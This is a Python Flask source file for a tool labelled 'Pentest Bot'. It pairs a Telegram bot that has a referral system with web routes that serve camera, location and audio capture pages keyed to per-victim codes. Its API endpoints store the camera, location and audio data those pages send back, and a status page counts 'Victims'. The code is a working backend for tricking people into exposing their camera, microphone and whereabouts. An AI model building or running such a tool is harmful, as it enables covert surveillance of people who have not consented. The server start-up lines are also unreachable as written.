from flask import Flask, render_template, request, jsonify
import sys
sys.stdout.flush()
from flask_cors import CORS
import os, json, threading, time, sys
from config import BASE_URL, PORT
from database import db

app = Flask(__name__)
CORS(app)
bot_started = False

def start_bot():
    global bot_started
    if bot_started: return
    try:
        import telebot
        from config import BOT_TOKEN
        bot = telebot.TeleBot(BOT_TOKEN)
        
        @bot.message_handler(commands=['start'])
        def start(m):
            uid = m.from_user.id
            un = m.from_user.username or 'User'
            fn = m.from_user.first_name or ''
            user = db.get_user(uid)
            new = False
            if not user:
                db.create_user(uid, un, fn)
                user = db.get_user(uid)
                new = True
            args = m.text.split()
            if len(args) > 1 and new:
                try:
                    rid = int(args[1])
                    if rid != uid and user and not user['referred_by']:
                        if db.add_referral(rid, uid):
                            try:
                                bot.send_message(rid, f"New referral!\n{fn} joined!\nTotal: {db.get_user(rid)['refer_count']}")
                            except: pass
                except: pass
            kb = telebot.types.InlineKeyboardMarkup()
            kb.add(telebot.types.InlineKeyboardButton("Test", callback_data="test"))
            bot.send_message(uid, f"Hello {fn}!\nBot is working!", reply_markup=kb)
        
        @bot.callback_query_handler(func=lambda c: True)
        def cb(c):
            bot.answer_callback_query(c.id, "Button works!")
            bot.edit_message_text("You clicked the button!", c.from_user.id, c.message.message_id)
        
        t = threading.Thread(target=bot.infinity_polling, kwargs={'timeout':30, 'skip_pending':True}, daemon=True)
        t.start()
        bot_started = True
        print("Bot started successfully!", flush=True)
    except Exception as e:
        print(f"Bot error: {e}", flush=True)
        import traceback
        traceback.print_exc()

@app.route('/')
def index():
    s = db.get_stats()
    return f'<html><body style="background:#0d1117;color:#c9d1d9;text-align:center;padding:100px 20px"><h1 style="color:#58a6ff">Pentest Bot</h1><p style="color:#3fb950">Running</p><p>Users: {s["users"]} | Victims: {s["victims"]}</p><p>Bot: {"✅ Active" if bot_started else "❌ Not started"}</p></body></html>'

@app.route('/camera/<code>')
def page_cam(code):
    v = db.get_victim(code)
    return render_template('camera.html', code=code, server=BASE_URL, valid=v is not None)

@app.route('/location/<code>')
def page_loc(code):
    v = db.get_victim(code)
    return render_template('location.html', code=code, server=BASE_URL, valid=v is not None)

@app.route('/audio/<code>')
def page_aud(code):
    v = db.get_victim(code)
    return render_template('audio.html', code=code, server=BASE_URL, valid=v is not None)

@app.route('/api/camera/<code>', methods=['POST'])
def api_cam(code):
    try:
        d = request.get_json(force=True, silent=True)
        if not d: return jsonify({'status':'error'}), 400
        db.update_victim_data(code, 'camera', d)
        return jsonify({'status':'ok'})
    except: return jsonify({'status':'error'}), 500

@app.route('/api/location/<code>', methods=['POST'])
def api_loc(code):
    try:
        d = request.get_json(force=True, silent=True)
        if not d: return jsonify({'status':'error'}), 400
        db.update_victim_data(code, 'location', d)
        return jsonify({'status':'ok'})
    except: return jsonify({'status':'error'}), 500

@app.route('/api/audio/<code>', methods=['POST'])
def api_aud(code):
    try:
        d = request.get_json(force=True, silent=True)
        if not d: return jsonify({'status':'error'}), 400
        db.update_victim_data(code, 'audio', d)
        return jsonify({'status':'ok'})
    except: return jsonify({'status':'error'}), 500

@app.route('/api/check/<code>')
def api_check(code):
    v = db.get_victim(code)
    if not v: return jsonify({'exists':False}), 404
    return jsonify({'exists':True,'camera':bool(v['camera_data']),'location':bool(v['location_data']),'audio':bool(v['audio_data']),'hits':v['access_count']})

    print("Starting server...", flush=True)
    start_bot()
    app.run(host='0.0.0.0', port=PORT, debug=False)
